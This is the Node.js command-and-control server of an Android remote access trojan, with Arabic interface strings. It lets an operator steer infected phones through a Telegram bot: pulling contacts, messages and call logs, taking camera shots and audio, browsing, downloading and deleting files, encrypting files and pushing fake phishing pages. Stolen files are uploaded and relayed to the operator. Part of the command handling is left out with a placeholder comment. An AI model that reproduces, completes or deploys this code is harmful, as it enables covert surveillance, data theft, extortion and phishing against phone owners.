const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

const actions = [
    '📒 سحب جهات الاتصال 📒',
    '💬 سحب الرسائل 💬',
    '📞 سجل المكالمات 📞',
    '📽 التطبيقات 📽',
    '📸 كيمرا أمامية 📸',
    '📸 كيمرا خلفية 📸',
    '📂 عرض جميع الملفات 📂',
    '🎙 تسجيل صوت 🎙',
    '💬 ارسال رسالة نصية 💬',
    '📧 ارسال رسالة للجميع 📧',
    '🛑 ايقاف الاشعارات 🛑',
    '📳 اهتزاز 📳',
    '😎 لقطة شاشة 😎',
    '▶ تشغيل الصوت ▶',
    '🛑 ايقاف الصوت 🛑',
    '⚠️ تشفير ⚠️',
    '⚠️ فك التشفير ⚠️',
    '‼ اشعار صفحة مزورة ‼',
    '✯ حولنا ✯',
    '✯ التراجع ✯',
    '✯ جميع الاجهزة ✯',
    '✯ العودة إلى القائمة الرئيسية ✯'
];

// المسارات الأساسية
app.get('/', (req, res) => {
    res.send('بوت رات قوي تحكم ✯');
});

app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const fileBuffer = req.file.buffer;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: '<b>✯ تم استلام ملف من → ' + fileName + '</b>',
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: 'file'
    });
    
    res.send('Done');
});

// اتصال السوكيت
io.on('connection', socket => {
    let deviceName = socket.handshake.headers['user-agent'] + '-' + io.sockets.sockets.size || 'no information';
    let deviceModel = socket.handshake.headers['model'] || 'no information';
    let deviceIp = socket.handshake.headers['ip'] || 'no information';
    
    socket.deviceName = deviceName;
    socket.deviceModel = deviceModel;
    
    let connectMessage = '<b>✯ تم توصيل جهاز جديد</b>\n\n' +
        '<b>اسم الهاتف</b> → ' + deviceName + '\n' +
        '<b>موديل الهاتف</b> → ' + deviceModel + '\n' +
        '<b>آيبي الهاتف</b> → ' + deviceIp + '\n' +
        '<b>الوقت</b> → ' + socket.handshake.time + '\n\n';
    
    bot.sendMessage(data.id, connectMessage, { parse_mode: 'HTML' });
    
    socket.on('disconnect', () => {
        let disconnectMessage = '<b>✯ تم قطع اتصال الجهاز</b>\n\n' +
            '<b>اسم الهاتف</b> → ' + deviceName + '\n' +
            '<b>موديل الهاتف</b> → ' + deviceModel + '\n' +
            '<b>آيبي الهاتف</b> → ' + deviceIp + '\n' +
            '<b>الوقت</b> → ' + socket.handshake.time + '\n\n';
        
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });
    
    // معالجة قوائم الملفات
    socket.on('fileList', fileList => {
        let buttons = [];
        let row = [];
        
        fileList.forEach((file, index, array) => {
            let callbackData;
            if (file.isFolder) {
                callbackData = deviceName + '|cd-' + file.name;
            } else {
                callbackData = deviceName + '|download-' + file.name;
            }
            
            if (row.length === 1 || row.length === 2) {
                row.push({
                    text: file.name,
                    callback_data: callbackData
                });
                if (index === array.length - 1) {
                    buttons.push(row);
                }
            } else {
                if (row.length === 0) {
                    row.push({
                        text: file.name,
                        callback_data: callbackData
                    });
                }
            }
        });
        
        buttons.push([{
            text: '✯ الرجوع ✯',
            callback_data: deviceName + '|back-0'
        }]);
        
        bot.sendMessage(data.id, '<b>✯ حدد اي ملف تريد تحميله من جهاز → ' + deviceName + '</b>', {
            reply_markup: { inline_keyboard: buttons },
            parse_mode: 'HTML'
        });
    });
    
    socket.on('message', messageData => {
        bot.sendMessage(data.id, '<b>✯ تم استلام رسالة من → ' + deviceName + '\n\nالرسالة → </b>' + messageData, { parse_mode: 'HTML' });
    });
});

// معالج رسائل التيلجرام
bot.on('message', message => {
    if (message.text === '/start') {
        bot.sendMessage(data.id, '<b>✯ اهلآ وسهلا في اقوى بوت تحكم ✯</b>\n\n' +
            'تم تطوير هذا البوت من قبل المطور @u_x86\n' +
            'بوت رات قوي تحكم وسهل الاستخدام\n\n', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزة ✯', '✯ جميع ✯'],
                    ['✯ حولنا ✯']
                ],
                resize_keyboard: true
            }
        });
    } else if (appData.get('currentAction') === 'smsNumber') {
        // معالجة رقم SMS
        let phoneNumber = message.text;
        let target = appData.get('currentTarget');
        
        io.to(target).emit('commend', {
            request: 'sendSms',
            extras: [{ key: 'number', value: phoneNumber }]
        });
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        bot.sendMessage(data.id, '<b>✯ تم تنفيذ الطلب بنجاح، سوف تتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزة ✯', '✯ جميع ✯'],
                    ['✯ حولنا ✯']
                ],
                resize_keyboard: true
            }
        });
    }
    // ... باقي معالجات الأوامر مشابهة للكود السابق
});

// معالج استدعاء الزر
bot.on('callback_query', callback => {
    console.log(callback);
    let data = callback.data;
    let deviceId = data.split('|')[0];
    let actionData = data.split('|')[1];
    let action = actionData.split('-')[0];
    let parameter = actionData.split('-')[1];
    
    if (action === 'back') {
        io.sockets.sockets.forEach((socket, id, map) => {
            if (socket.deviceName === deviceId) {
                io.to(id).emit('commend', {
                    request: 'back',
                    extras: []
                });
            }
        });
    } else if (action === 'cd') {
        io.sockets.sockets.forEach((socket, id, map) => {
            if (socket.deviceName === deviceId) {
                io.to(id).emit('commend', {
                    request: 'cd',
                    extras: [{ key: 'path', value: parameter }]
                });
            }
        });
    } else if (action === 'download') {
        io.sockets.sockets.forEach((socket, id, map) => {
            if (socket.deviceName === deviceId) {
                io.to(id).emit('commend', {
                    request: 'download',
                    extras: [{ key: 'file', value: parameter }]
                });
            }
        });
    } else if (action === 'delete') {
        io.sockets.sockets.forEach((socket, id, map) => {
            if (socket.deviceName === deviceId) {
                io.to(id).emit('commend', {
                    request: 'delete',
                    extras: [{ key: 'file', value: parameter }]
                });
            }
        });
    } else if (action === 'upload') {
        bot.editMessageText('<b>✯ ارسل الملف الذي تريد رفعه إلى → ' + parameter + '</b>', {
            chat_id: data.id,
            message_id: callback.message.message_id,
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: '**موافق**',
                        callback_data: deviceId + '|uploadConfirm-' + parameter
                    },
                    {
                        text: '**الغاء**',
                        callback_data: deviceId + '|uploadCancel-' + parameter
                    }
                ]]
            },
            parse_mode: 'HTML'
        });
    }
});

// بينغ للأجهزة
setInterval(() => {
    io.sockets.sockets.forEach((socket, id, map) => {
        io.to(id).emit('ping', {});
    });
}, 5000);

// تشغيل السيرفر
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});
